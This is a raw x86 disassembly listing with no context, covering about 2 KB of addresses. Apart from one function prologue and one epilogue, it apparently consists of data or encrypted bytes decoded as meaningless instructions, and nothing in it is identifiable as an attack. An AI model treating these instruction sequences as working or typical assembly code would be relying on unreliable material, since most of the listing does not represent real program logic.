  4057ce:	enter  0xe722,0x0
  4057d2:	mov    ds:0xb10550dc,al
  4057d7:	mov    ds,WORD PTR [ecx]
  4057d9:	cmp    ah,BYTE PTR [ebx-0x3b]
  4057dc:	push   eax
  4057dd:	jae    0x4057d5
  4057df:	pop    ds
  4057e0:	jae    0x4057e0
  4057e2:	ins    DWORD PTR es:[edi],dx
  4057e3:	ficomp DWORD PTR [ecx]
  4057e5:	outs   dx,BYTE PTR ds:[esi]
  4057e6:	test   BYTE PTR [eax+0x1b758c19],dl
  4057ec:	mov    bl,0x16
  4057ee:	rol    BYTE PTR [ecx+0x36],cl
  4057f1:	ds jecxz 0x405775
  4057f4:	xchg   esp,eax
  4057f5:	fidivr WORD PTR [edx-0x19561abb]
  4057fb:	or     BYTE PTR [eax+0x7b9a5ada],0xbd
  405802:	fs in  eax,dx
  405804:	add    al,0xc6
  405806:	ja     0x405830
  405808:	repnz daa 
  40580a:	or     al,0xd8
  40580c:	sar    DWORD PTR [eax],cl
  40580e:	cmp    DWORD PTR [esi],eax
  405810:	fs cli 
  405812:	test   BYTE PTR [esp+ebx*8-0x7e],ah
  405816:	(bad)  [edi]
  405818:	mov    ds:0xdfc3b415,al
  40581d:	mov    esi,edi
  40581f:	mov    WORD PTR [ebx],ds
  405821:	pusha  
  405822:	sbb    ebp,ebp
  405824:	sub    eax,0xa8cf7cb8
  405829:	mov    dh,0x81
  40582b:	xchg   esi,eax
  40582c:	adc    DWORD PTR [esi-0x9792ee0],esp
  405832:	jo     0x405824
  405834:	sti    
  405835:	mov    bh,0x1a
  405837:	pop    es
  405838:	hlt    
  405839:	in     eax,dx
  40583a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40583b:	mov    bh,0x2e
  40583d:	mov    esi,0x69f72a8a
  405842:	inc    sp
  405844:	xchg   esp,eax
  405845:	pusha  
  405846:	inc    ebx
  405847:	es pop esi
  405849:	sar    BYTE PTR [eax-0x7f779fff],cl
  40584f:	add    DWORD PTR [ecx],ebx
  405851:	lods   al,BYTE PTR ds:[esi]
  405852:	pop    ecx
  405853:	xor    cl,dl
  405855:	sub    al,0xf0
  405857:	xchg   esi,eax
  405858:	fs mov eax,0xce6fd7c4
  40585e:	ins    BYTE PTR es:[edi],dx
  40585f:	mov    ebp,0xfde291aa
  405864:	mov    dl,0x3e
  405866:	test   eax,0x37056e0d
  40586b:	adc    eax,0x19a80b08
  405870:	jne    0x4058c0
  405872:	sub    DWORD PTR [ebx+0x20f0becf],eax
  405878:	mov    eax,ds:0x76da4958
  40587d:	fistp  WORD PTR [esi-0x3e9f8e8b]
  405883:	mov    al,0x6
  405885:	scas   eax,DWORD PTR es:[edi]
  405886:	in     al,dx
  405887:	jmp    0xd87d:0x6b285717
  40588e:	imul   edx,DWORD PTR [esi],0xffffffd8
  405891:	cmp    BYTE PTR [ecx],dh
  405893:	adc    al,0x24
  405895:	xchg   edi,eax
  405896:	ret    
  405897:	mov    ds,WORD PTR [ecx+0x1051fc4f]
  40589d:	clc    
  40589e:	ins    BYTE PTR es:[edi],dx
  40589f:	pop    es
  4058a0:	scas   al,BYTE PTR es:[edi]
  4058a1:	imul   eax,DWORD PTR [ecx+0x6c4e2298],0x362be89
  4058ab:	mov    edx,0x759ddd2b
  4058b0:	aaa    
  4058b1:	mov    ebp,0x9559410a
  4058b6:	(bad)  
  4058b7:	jbe    0x4058f9
  4058b9:	mov    ah,0xc7
  4058bb:	jae    0x4058f9
  4058bd:	pop    esi
  4058be:	add    ebx,DWORD PTR [esi]
  4058c0:	mul    BYTE PTR [esi-0x29]
  4058c3:	xchg   edi,eax
  4058c4:	jl     0x40591b
  4058c6:	lods   al,BYTE PTR ds:[esi]
  4058c7:	add    al,0x88
  4058c9:	mov    WORD PTR [edi+eiz*1+0x21e581c],?
  4058d0:	aad    0x7f
  4058d2:	push   0x792f961a
  4058d7:	inc    esp
  4058d8:	cmp    ch,BYTE PTR [edx-0x42]
  4058db:	adc    ebx,DWORD PTR [esi]
  4058dd:	(bad)  
  4058de:	das    
  4058df:	dec    esi
  4058e0:	shl    BYTE PTR [esi+eax*8+0x6e],0x70
  4058e5:	je     0x405887
  4058e7:	push   ebp
  4058e8:	retf   0x5dcd
  4058eb:	sbb    al,0x80
  4058ed:	jp     0x405960
  4058ef:	rcl    DWORD PTR [edx-0x75],1
  4058f2:	out    0x24,al
  4058f4:	aas    
  4058f5:	mov    DWORD PTR [edx+0x8ef0893],esi
  4058fb:	sbb    edi,DWORD PTR [ebp-0x26]
  4058fe:	jg     0x40597c
  405900:	rol    DWORD PTR [ecx+0x5dc6373f],cl
  405906:	jle    0x405902
  405908:	push   ss
  405909:	adc    bh,ch
  40590b:	inc    edx
  40590c:	pop    ebp
  40590d:	xor    BYTE PTR [ecx+0xb7bec6],ch
  405913:	aaa    
  405914:	scas   al,BYTE PTR es:[edi]
  405915:	sub    eax,0x4712fddc
  40591a:	sub    dl,ch
  40591c:	sub    esi,DWORD PTR [ebp-0x685c3acf]
  405922:	dec    edx
  405923:	lods   al,BYTE PTR ds:[esi]
  405924:	clc    
  405925:	xchg   ecx,eax
  405926:	xor    DWORD PTR [esp+ebp*4],esp
  405929:	daa    
  40592a:	jne    0x40590a
  40592c:	adc    ecx,DWORD PTR [edi+0x103976a8]
  405932:	imul   ecx,DWORD PTR [esp+ecx*4+0x58703919],0x4f
  40593a:	mov    ebx,DWORD PTR [ebx]
  40593c:	shr    BYTE PTR [ebx+0x7476ac82],cl
  405942:	scas   eax,DWORD PTR es:[edi]
  405943:	sbb    DWORD PTR [eax],eax
  405945:	jge    0x405993
  405947:	push   ebx
  405948:	data16 mov cl,BYTE PTR [esi+0x62]
  40594c:	in     eax,0xd0
  40594e:	xchg   ebp,eax
  40594f:	clc    
  405950:	stos   BYTE PTR es:[edi],al
  405951:	cmp    al,0xc4
  405953:	cmp    bl,BYTE PTR [esi+0x13]
  405956:	fbld   TBYTE PTR [edx-0x26f3ad1f]
  40595c:	test   al,0x1b
  40595e:	cmp    BYTE PTR [edi+ebx*4],bl
  405961:	jl     0x4059d6
  405963:	mov    al,0xd6
  405965:	jo     0x40599d
  405967:	sub    DWORD PTR [ebp+eax*1-0x49],0xffffffdb
  40596c:	pop    eax
  40596d:	leave  
  40596e:	test   al,0xa
  405970:	call   0xedb5:0x5bdcc794
  405977:	aaa    
  405978:	ret    0xe2d0
  40597b:	cmc    
  40597c:	stc    
  40597d:	lds    eax,FWORD PTR [eax]
  40597f:	nop
  405980:	jno    0x4059ac
  405982:	and    al,0xa0
  405984:	aas    
  405985:	inc    edi
  405986:	xchg   esp,eax
  405987:	mov    DWORD PTR [ecx],0x80463672
  40598d:	dec    edx
  40598e:	in     al,dx
  40598f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405990:	aam    0x84
  405992:	shl    ah,0xbf
  405995:	push   edx
  405996:	xlat   BYTE PTR ds:[ebx]
  405997:	sbb    ebp,DWORD PTR [ebp+0x74e8afc7]
  40599d:	gs jae 0x405959
  4059a0:	mov    ecx,0xf53c66c4
  4059a5:	sub    BYTE PTR [ecx-0x2f],bl
  4059a8:	add    esi,DWORD PTR [eax+0x213bc69b]
  4059ae:	mov    ds:0xdf197ded,eax
  4059b3:	test   al,0x23
  4059b5:	jo     0x405958
  4059b7:	push   eax
  4059b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059b9:	jg     0x405964
  4059bb:	jbe    0x4059ea
  4059bd:	cmp    al,0x97
  4059bf:	fucomi st,st(3)
  4059c1:	and    eax,0xf794f90e
  4059c6:	add    DWORD PTR [edi-0x9],eax
  4059c9:	add    DWORD PTR es:[edx-0x113990ba],ecx
  4059d0:	addr16 enter 0x561,0x9b
  4059d5:	cmp    edi,DWORD PTR [ecx]
  4059d7:	or     ebp,DWORD PTR [edi+0x4c30179d]
  4059dd:	mov    esp,0x4789e429
  4059e2:	jb     0x405a4b
  4059e4:	sub    cl,BYTE PTR [eax-0xe]
  4059e7:	jnp    0x405977
  4059e9:	push   es
  4059ea:	mov    edi,0xbf4c8650
  4059ef:	add    DWORD PTR [eax+0x3b107503],ecx
  4059f5:	(bad)  
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x405a10
  405a20:	(bad)  
  405a21:	xor    al,0xd
  405a23:	cmp    BYTE PTR [bx+si+0x78],bh
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x4059b5
  405a2c:	and    DWORD PTR [ecx+0x11867458],ecx
  405a32:	repz aam 0x65
  405a35:	adc    DWORD PTR [edx+0x43],ebp
  405a38:	test   eax,0x6b22c384
  405a3d:	dec    edi
  405a3e:	clc    
  405a3f:	stos   DWORD PTR es:[edi],eax
  405a40:	clc    
  405a41:	dec    esi
  405a42:	xchg   esi,eax
  405a43:	push   ebp
  405a44:	push   edi
  405a45:	in     al,dx
  405a46:	xor    DWORD PTR [edi+0xee86722],esp
  405a4c:	mov    bl,BYTE PTR [ecx+0x3a]
  405a4f:	addr16 jae 0x405a27
  405a52:	mov    esp,0xeb79c62e
  405a57:	iret   
  405a58:	call   0x259829ad
  405a5d:	adc    ecx,DWORD PTR [esi+0x4d82af2c]
  405a63:	mov    bl,0xb3
  405a65:	mov    DWORD PTR [ecx-0x26],ebx
  405a68:	pop    ds
  405a69:	pop    ds
  405a6a:	ds sub eax,0xda280fdf
  405a70:	(bad)  
  405a71:	fwait
  405a72:	cdq    
  405a73:	pop    ss
  405a74:	jle    0x405a33
  405a76:	jmp    DWORD PTR [ecx]
  405a78:	call   0xaba0fa75
  405a7d:	call   0x9bff5953
  405a82:	jle    0x405a3a
  405a84:	push   ecx
  405a85:	loop   0x405ad8
  405a87:	pop    es
  405a88:	ins    BYTE PTR es:[edi],dx
  405a89:	or     al,0x37
  405a8b:	mov    ebx,0x5eedbeed
  405a90:	(bad)
  405a93:	aaa    
  405a94:	ficomp WORD PTR [ebp+0x34]
  405a97:	loope  0x405a59
  405a99:	jb     0x405af8
  405a9b:	pop    es
  405a9c:	mov    ds:0x14416e44,al
  405aa1:	dec    esi
  405aa2:	in     eax,dx
  405aa3:	xor    edi,DWORD PTR [esi]
  405aa5:	pusha  
  405aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa7:	adc    eax,0xe8bf12ad
  405aac:	lods   al,BYTE PTR ds:[esi]
  405aad:	jle    0x405b0e
  405aaf:	lds    edi,FWORD PTR [eax+edx*2+0x4edf0c45]
  405ab6:	ins    DWORD PTR es:[edi],dx
  405ab7:	daa    
  405ab8:	shr    DWORD PTR [esi+0x5c],cl
  405abb:	ror    BYTE PTR es:[edi],1
  405abe:	cmc    
  405abf:	dec    esi
  405ac0:	push   ebp
  405ac1:	ja     0x405a88
  405ac3:	jae    0x405ae1
  405ac5:	mov    dh,0xb3
  405ac7:	adc    DWORD PTR [ebp+0x75],0x3b
  405acb:	add    esp,DWORD PTR [esi+0x33]
  405ace:	hlt    
  405acf:	add    ebx,edi
  405ad1:	lea    esp,[ebp+0x5a]
  405ad4:	or     al,al
  405ad6:	imul   esp,DWORD PTR [ebx-0x111cf628],0xffffffd0
  405add:	bound  eax,QWORD PTR [ebp+ecx*1+0x11]
  405ae1:	loopne 0x405b1a
  405ae3:	inc    ebp
  405ae4:	repz push esi
  405ae6:	fwait
  405ae7:	int    0x81
  405ae9:	repz into 
  405aeb:	dec    edx
  405aec:	add    bl,BYTE PTR [eax+esi*4]
  405aef:	scas   al,BYTE PTR es:[edi]
  405af0:	mov    eax,0x165ddb6
  405af5:	jecxz  0x405b17
  405af7:	daa    
  405af8:	(bad)
  405afc:	sub    al,0x73
  405afe:	lock js 0x405b64
  405b01:	inc    eax
  405b02:	mov    ds:0xaf5e4edc,eax
  405b07:	dec    edi
  405b08:	inc    esi
  405b09:	adc    DWORD PTR [ebp+0x2d4724e3],eax
  405b0f:	mov    ebp,0x47ad8a8b
  405b14:	push   esi
  405b15:	mov    ebx,DWORD PTR [ecx+0x37431750]
  405b1b:	lods   al,BYTE PTR ds:[esi]
  405b1c:	int3   
  405b1d:	cmp    ebp,edi
  405b1f:	es fs and bh,ch
  405b23:	xor    al,BYTE PTR [edi-0x727f4dd0]
  405b29:	cmp    bl,cl
  405b2b:	xor    eax,0x5cececfe
  405b30:	test   eax,0x7a00c41c
  405b35:	push   ds
  405b36:	mov    BYTE PTR [eax+esi*8+0x56],cl
  405b3a:	js     0x405acc
  405b3c:	clc    
  405b3d:	in     eax,dx
  405b3e:	sub    ecx,DWORD PTR [edi+0x58a25496]
  405b44:	imul   esi,edi,0x2c
  405b47:	jb     0x405bba
  405b49:	in     al,0x9c
  405b4b:	mul    DWORD PTR [edx+0x6cb7e63f]
  405b51:	sbb    al,0x82
  405b54:	ret    
  405b55:	pop    edx
  405b56:	(bad)  
  405b57:	dec    ecx
  405b58:	adc    al,BYTE PTR [esi]
  405b5a:	aad    0x7a
  405b5c:	cld    
  405b5d:	jae    0x405bd2
  405b5f:	lds    ecx,FWORD PTR [edx-0x26]
  405b62:	xchg   esp,eax
  405b63:	das    
  405b64:	icebp  
  405b65:	adc    DWORD PTR [ebx-0x44],esi
  405b68:	xchg   esp,eax
  405b69:	dec    esi
  405b6a:	mov    ch,BYTE PTR [edx]
  405b6c:	push   ds
  405b6d:	sub    dh,dh
  405b6f:	xchg   ecx,eax
  405b70:	xor    eax,0x6b3001ca
  405b75:	fld    QWORD PTR [eax]
  405b77:	jmp    0xe0d0:0x856be1ac
  405b7e:	hlt    
  405b7f:	add    BYTE PTR [edi],bh
  405b81:	sbb    DWORD PTR [edx],esp
  405b83:	mov    al,ds:0xbacd5a47
  405b88:	jle    0x405b20
  405b8a:	xor    al,0xc7
  405b8c:	mov    ds,WORD PTR gs:[edi+0x3b]
  405b90:	shl    DWORD PTR [ebp+ebx*2+0x79],cl
  405b94:	dec    esp
  405b95:	adc    BYTE PTR ds:0xe55230ba,0xa4
  405b9c:	xchg   ebx,eax
  405b9d:	sub    al,0x3d
  405b9f:	sub    DWORD PTR [edi+0x2ded3f21],esi
  405ba5:	mov    BYTE PTR [edi+0x3],ah
  405ba8:	rol    DWORD PTR [edi+0x395c186e],0x6b
  405baf:	(bad)  
  405bb0:	out    dx,eax
  405bb1:	out    dx,al
  405bb2:	ins    DWORD PTR es:[edi],dx
  405bb3:	mov    ds:0x7a439d60,al
  405bb8:	fmul   st(5),st
  405bba:	ret    
  405bbb:	mov    ?,WORD PTR [ebx-0x29]
  405bbe:	loopne 0x405bc3
  405bc0:	je     0x405bbb
  405bc2:	add    al,0x22
  405bc4:	push   es
  405bc5:	and    al,0x78
  405bc7:	fld    DWORD PTR [ebx+0x48c7325]
  405bcd:	mov    bh,0xb4
  405bcf:	push   0xffffffc4
  405bd1:	pop    ss
  405bd2:	cmp    DWORD PTR [ecx],ebx
  405bd4:	mov    edi,0x75449009
  405bd9:	out    0xa6,eax
  405bdb:	cmc    
  405bdc:	(bad)  
  405bdd:	mov    edi,0xee5b4270
  405be2:	jb     0x405bf7
  405be4:	rcr    BYTE PTR [esi-0x7736da2c],0x41
  405beb:	mov    bl,0x0
  405bed:	dec    ebp
  405bee:	neg    ebp
  405bf0:	push   edx
  405bf1:	fstp   QWORD PTR [ebp-0x3eea6065]
  405bf7:	stc    
  405bf8:	adc    al,0x1
  405bfa:	jnp    0x405bbe
  405bfc:	fistp  QWORD PTR ds:0x73682944
  405c02:	and    eax,DWORD PTR [ebp+0x5739552d]
  405c08:	aam    0xf
  405c0a:	popa   
  405c0b:	mov    DWORD PTR [ebx-0x69],ebx
  405c0e:	jge    0x405bce
  405c10:	pop    ss
  405c11:	jecxz  0x405be2
  405c13:	in     al,dx
  405c14:	dec    ebp
  405c15:	push   edx
  405c16:	mov    esp,0x3875939f
  405c1b:	test   BYTE PTR ds:0x594a4172,0x62
  405c22:	pop    ecx
  405c23:	das    
  405c24:	hlt    
  405c25:	sbb    esi,esp
  405c27:	inc    esp
  405c28:	pop    ss
  405c29:	or     eax,0x62e3a0f0
  405c2e:	jle    0x405c78
  405c30:	out    dx,eax
  405c31:	pop    ss
  405c32:	addr16 add cl,dh
  405c35:	cmp    ebx,esp
  405c37:	dec    ebp
  405c38:	shl    eax,cl
  405c3a:	loop   0x405ca0
  405c3c:	adc    dl,BYTE PTR [ebx]
  405c3e:	test   eax,0x2e7f94bb
  405c43:	loopne 0x405c0f
  405c45:	adc    eax,0xa81aad6f
  405c4a:	ins    BYTE PTR es:[edi],dx
  405c4b:	sub    al,0x47
  405c4d:	jg     0x405bd5
  405c4f:	out    dx,al
  405c50:	dec    esi
  405c51:	test   DWORD PTR es:[esi+0x24e40bfe],ecx
  405c58:	movzx  eax,BYTE PTR [ebp+0x6e]
  405c5c:	mov    ebx,0x101662a8
  405c61:	xor    bl,cl
  405c63:	or     eax,esi
  405c65:	mov    dh,0x33
  405c67:	scas   eax,DWORD PTR es:[edi]
  405c68:	out    dx,eax
  405c69:	ins    BYTE PTR es:[edi],dx
  405c6a:	fldcw  WORD PTR [ecx+ecx*8]
  405c6d:	ja     0x405cea
  405c6f:	es (bad) 
  405c72:	imul   ecx,ebp,0x5ce9cfec
  405c78:	dec    esi
  405c79:	retf   0x5fde
  405c7c:	inc    esi
  405c7d:	dec    ecx
  405c7e:	jns    0x405cc3
  405c80:	(bad)  
  405c83:	stos   BYTE PTR es:[edi],al
  405c84:	mov    ds:0x8f244dfa,al
  405c89:	mov    dl,0xf4
  405c8b:	jmp    0x1b4f:0xfe2d648e
  405c92:	mov    ah,0xab
  405c94:	pop    esi
  405c95:	xchg   ecx,eax
  405c96:	xor    ah,BYTE PTR [edx-0x30f7b27a]
  405c9c:	inc    edx
  405c9d:	clc    
  405c9e:	dec    ecx
  405c9f:	cmp    bl,bh
  405ca1:	and    ecx,0x74
  405ca4:	mov    ch,0xf7
  405ca6:	xchg   ebp,eax
  405ca7:	adc    al,0x15
  405ca9:	test   edi,ecx
  405cab:	mov    esi,0xdacb8fe6
  405cb0:	rol    BYTE PTR [esi-0x21a6f85a],0x56
  405cb7:	xor    dl,BYTE PTR [esi-0x6f23620f]
  405cbd:	aam    0xb1
  405cbf:	out    0x3e,al
  405cc1:	aaa    
  405cc2:	jge    0x405c52
  405cc4:	mov    cl,0x67
  405cc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cc7:	shl    BYTE PTR [ecx+eax*4+0x3e],1
  405ccb:	shl    BYTE PTR ds:0x1994a595,cl
  405cd1:	cmp    al,0x28
  405cd3:	xor    eax,0x3e8020eb
  405cd8:	xlat   BYTE PTR ds:[ebx]
  405cd9:	fisubr DWORD PTR [esi]
  405cdb:	mov    al,ds:0x9bee89e4
  405ce0:	pop    ecx
  405ce1:	sub    DWORD PTR [edx-0x29],0x29
  405ce5:	je     0x405d49
  405ce7:	pop    ebp
  405ce8:	jmp    0x405d12
  405cea:	and    al,0xc3
  405cec:	push   cs
  405ced:	imul   dh
  405cef:	mov    dl,0x64
  405cf1:	xchg   esi,eax
  405cf2:	pop    ecx
  405cf3:	rcl    DWORD PTR [esi-0x6fa28276],1
  405cf9:	mov    ebp,0xefced5c
  405cfe:	xor    edx,edx
  405d00:	jmp    0x405ff0
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0xf03a4c09
  405d13:	dec    esi
  405d14:	jp     0x405cca
  405d16:	cmp    eax,0x7e4d7878
  405d1b:	js     0x405d95
  405d1d:	mov    ah,al
  405d1f:	dec    esi
  405d20:	and    BYTE PTR [ecx],0xff
  405d23:	mov    esp,0x685fbf14
  405d28:	or     edx,DWORD PTR [eax-0x1b2d9108]
  405d2e:	sahf   
  405d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d30:	xchg   ebx,eax
  405d31:	ror    BYTE PTR [ecx-0x4879dc00],1
  405d37:	xchg   DWORD PTR [ecx],esi
  405d39:	xlat   BYTE PTR ds:[ebx]
  405d3a:	jl     0x405d62
  405d3c:	mov    al,ds:0x1683458e
  405d41:	push   esi
  405d42:	cmp    edx,DWORD PTR [esi+ebx*1]
  405d45:	sub    BYTE PTR [eax],ah
  405d47:	push   es
  405d48:	mov    BYTE PTR [ebp+0x739767db],bl
  405d4e:	mov    ecx,0xc7144512
  405d53:	icebp  
  405d54:	(bad)  
  405d55:	sbb    al,0x48
  405d57:	out    0xef,eax
  405d59:	push   ss
  405d5a:	dec    esi
  405d5b:	aad    0xb1
  405d5d:	daa    
  405d5e:	push   edx
  405d5f:	push   ss
  405d60:	sbb    al,0xc4
  405d62:	das    
  405d63:	pop    ecx
  405d64:	gs and eax,0xd653360b
  405d6a:	push   ecx
  405d6b:	sbb    BYTE PTR [edi+eax*1+0x1afcfe85],dl
  405d72:	dec    eax
  405d73:	sbb    eax,0x114bfb2d
  405d78:	mov    WORD PTR es:[ecx],gs
  405d7b:	push   0x7536a252
  405d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d81:	ja     0x405d35
  405d83:	inc    esi
  405d84:	iret   
  405d85:	test   al,0x1e
  405d87:	xor    eax,0x31dd079c
  405d8c:	aad    0xaa
  405d8e:	push   cs
  405d8f:	mov    dl,0x23
  405d91:	in     al,dx
  405d92:	jp     0x405da7
  405d94:	(bad)  
  405d95:	test   al,0xa3
  405d97:	jle    0x405dbc
  405d99:	out    0xeb,eax
  405d9b:	pop    esi
  405d9c:	or     DWORD PTR [esi-0x2],esi
  405d9f:	sbb    DWORD PTR [edx-0x54c6d09a],ebp
  405da5:	shl    BYTE PTR [ecx+ebx*1-0x70],cl
  405da9:	pop    es
  405daa:	jne    0x405d4c
  405dac:	jbe    0x405d82
  405dae:	jle    0x405e19
  405db0:	mov    edx,0x8fb25acd
  405db5:	retf   
  405db6:	push   es
  405db7:	push   edx
  405db8:	jmp    0x405deb
  405dba:	cmp    BYTE PTR [eax],bl
  405dbc:	jb     0x405d70
  405dbe:	and    eax,0x9740e911
  405dc3:	add    DWORD PTR [eax+esi*4-0x79e091cf],ebp
  405dca:	shr    DWORD PTR [edx],0x8c
  405dcd:	lock mov ebx,0xa260321
  405dd3:	sub    eax,0x52662648
  405dd8:	(bad)  
  405dd9:	push   DWORD PTR [edx]
  405ddb:	loope  0x405d79
  405ddd:	aaa    
  405dde:	sbb    eax,0x7a3ee776
  405de3:	sub    ebp,edi
  405de5:	mov    cl,bh
  405de7:	push   cs
  405de8:	and    DWORD PTR [ebp-0x1dd3ea20],ecx
  405dee:	mov    ah,0x64
  405df0:	push   esp
  405df1:	(bad)  
  405df2:	retf   
  405df3:	adc    al,0x2b
  405df5:	or     BYTE PTR [ebx-0x15f42642],al
  405dfb:	mov    bh,0x61
  405dfd:	pusha  
  405dfe:	out    0x46,al
  405e00:	rcl    DWORD PTR [eax*4-0x514a7626],0x37
  405e08:	jmp    0x405df9
  405e0a:	xor    DWORD PTR [edx+0x5cacf8d6],esi
  405e10:	stos   BYTE PTR es:[edi],al
  405e11:	push   ds
  405e12:	inc    esp
  405e13:	fmul   QWORD PTR ds:0x783fd9e5
  405e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e1a:	push   ss
  405e1b:	nop
  405e1c:	stos   BYTE PTR es:[edi],al
  405e1d:	in     eax,dx
  405e1e:	pop    eax
  405e1f:	jnp    0x405e2b
  405e21:	std    
  405e22:	jae    0x405e61
  405e24:	adc    BYTE PTR [ebp-0x7d],dl
  405e27:	cs pop ds
  405e29:	(bad)
  405e2d:	cmp    BYTE PTR [eax-0x314fd64],bl
  405e33:	jmp    0x29e69ea5
  405e38:	xor    edx,esi
  405e3a:	cmc    
  405e3b:	jnp    0x405e1e
  405e3d:	jb     0x405eb2
  405e3f:	or     esp,esi
  405e41:	sub    DWORD PTR [ecx+0x560f8a48],ebx
  405e47:	jb     0x405ea5
  405e49:	mov    ds,eax
  405e4b:	das    
  405e4c:	push   ecx
  405e4d:	mov    bl,0x98
  405e4f:	enter  0x174,0x34
  405e53:	mov    al,ss:0x92b38432
  405e59:	sbb    ebp,DWORD PTR [ecx-0x3a]
  405e5c:	div    BYTE PTR [ebx+0x36ec8294]
  405e62:	imul   DWORD PTR [ecx]
  405e64:	pop    ds
  405e65:	sti    
  405e66:	ja     0x405e0e
  405e68:	(bad)  
  405e69:	ins    DWORD PTR es:[edi],dx
  405e6a:	nop
  405e6b:	jp     0x405ec9
  405e6d:	int    0x1e
  405e6f:	jp     0x405eab
  405e71:	mov    eax,0xcfe4da37
  405e76:	ret    
  405e77:	push   ebp
  405e78:	leave  
  405e79:	push   0xa1ea0b70
  405e7e:	fwait
  405e7f:	scas   al,BYTE PTR es:[edi]
  405e80:	push   eax
  405e81:	nop
  405e82:	aam    0x32
  405e84:	retf   0x1199
  405e87:	sub    BYTE PTR [ebx],al
  405e89:	dec    edi
  405e8a:	mov    WORD PTR es:[edi],?
  405e8d:	and    esp,esi
  405e8f:	stos   DWORD PTR es:[edi],eax
  405e90:	xchg   ebx,eax
  405e91:	xor    ah,ch
  405e93:	pusha  
  405e94:	fidivr DWORD PTR [esi+0x7b]
  405e97:	pop    edi
  405e98:	cmp    edx,DWORD PTR [esi-0x64c4e594]
  405e9e:	arpl   WORD PTR [edi+0x69],ax
  405ea1:	mov    esi,0xf9e2d109
  405ea6:	sbb    edx,DWORD PTR [edi]
  405ea8:	test   eax,0xf84ad348
  405ead:	jmp    0x855ce557
  405eb2:	push   0x7
  405eb4:	push   DWORD PTR cs:[esi]
  405eb7:	xchg   ecx,eax
  405eb8:	clc    
  405eb9:	xchg   ecx,eax
  405eba:	mov    dh,0x1f
  405ebc:	aam    0xd8
  405ebe:	popf   
  405ebf:	adc    bh,ch
  405ec1:	addr16 jnp 0x405e73
  405ec4:	into   
  405ec5:	pushf  
  405ec6:	push   es
  405ec7:	add    bh,BYTE PTR [edx]
  405ec9:	inc    ecx
  405eca:	add    al,0xf0
  405ecc:	push   ebx
  405ecd:	les    ebp,FWORD PTR [ecx-0x5c]
  405ed0:	test   eax,0xa5a7a9d0
  405ed5:	daa    
  405ed6:	pmaxub mm3,QWORD PTR [edx+0x2f76d901]
  405edd:	jo     0x405f4a
  405edf:	fisub  DWORD PTR [ebx-0x555c7054]
  405ee5:	inc    esp
  405ee6:	sti    
  405ee7:	jmp    0xa769:0xfa4df440
  405eee:	and    BYTE PTR [edi-0x2cf18d60],dl
  405ef4:	and    ebx,ebx
  405ef6:	cmp    dh,BYTE PTR [edx+0x4bc56ccd]
  405efc:	daa    
  405efd:	stos   DWORD PTR es:[edi],eax
  405efe:	mov    ebx,DWORD PTR [edx-0x3a]
  405f01:	shl    DWORD PTR [edx],0x4f
  405f04:	scas   eax,DWORD PTR es:[edi]
  405f05:	into   
  405f06:	loop   0x405ea2
  405f08:	mov    ah,BYTE PTR [ebx+0x38794304]
  405f0e:	bnd jg 0x405ef2
  405f11:	mov    ds:0x1ceb52de,eax
  405f16:	cdq    
  405f17:	pop    edi
  405f18:	inc    ebp
  405f19:	mov    dh,0xb2
  405f1b:	pop    ds
  405f1c:	mov    dh,0xbe
  405f1e:	sti    
  405f1f:	add    bh,dl
  405f21:	js     0x405eda
  405f23:	mov    esp,DWORD PTR [edx-0x52a585cd]
  405f29:	lods   eax,DWORD PTR ds:[esi]
  405f2a:	inc    esp
  405f2b:	and    al,BYTE PTR [ecx-0x12]
  405f2e:	loopne 0x405eb1
  405f30:	xchg   edi,eax
  405f31:	push   ss
  405f32:	ins    DWORD PTR es:[edi],dx
  405f33:	lock adc eax,DWORD PTR [edx]
  405f36:	or     eax,0x718d415c
  405f3b:	ins    DWORD PTR es:[edi],dx
  405f3c:	sub    ecx,DWORD PTR [ebp-0x12]
  405f3f:	imul   ebx,DWORD PTR [eax-0x4b68ac56],0xd649e74b
  405f49:	cld    
  405f4a:	jle    0x405f76
  405f4c:	mov    dh,0xac
  405f4e:	inc    eax
  405f4f:	inc    eax
  405f50:	dec    esp
  405f51:	int    0xe3
  405f53:	cmp    BYTE PTR [eax],dl
  405f55:	ss es jecxz 0x405fc9
  405f59:	adc    eax,0x40e1439b
  405f5e:	sbb    esp,esi
  405f60:	inc    eax
  405f61:	dec    esp
  405f62:	pop    ecx
  405f63:	fisubr DWORD PTR [esi]
  405f65:	push   esi
  405f66:	jno    0x405f1b
  405f68:	fdivr  QWORD PTR ds:0x1be10546
  405f6e:	jns    0x405f63
  405f70:	shl    DWORD PTR [esi-0x77],0x15
  405f74:	or     DWORD PTR ds:[ecx+0x5a],0x24bc3bfd
  405f7c:	mov    BYTE PTR [ecx+0x33],bh
  405f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f80:	push   0xd71c1dbf
  405f85:	jne    0x405f40
  405f87:	add    BYTE PTR [ebx+0x36],0x2a
  405f8b:	mov    WORD PTR [edi-0x18b11c0a],fs
  405f91:	push   ebx
  405f92:	xchg   ebx,eax
  405f93:	cmp    al,dl
  405f95:	mov    al,cs:0xb366daaa
  405f9b:	fcom   st(1)
  405f9d:	and    DWORD PTR [eax],0xc1de87cf
  405fa3:	mov    al,BYTE PTR [ecx-0x5f9b0869]
  405fa9:	scas   eax,DWORD PTR es:[edi]
  405faa:	jo     0x40600f
  405fac:	cwde   
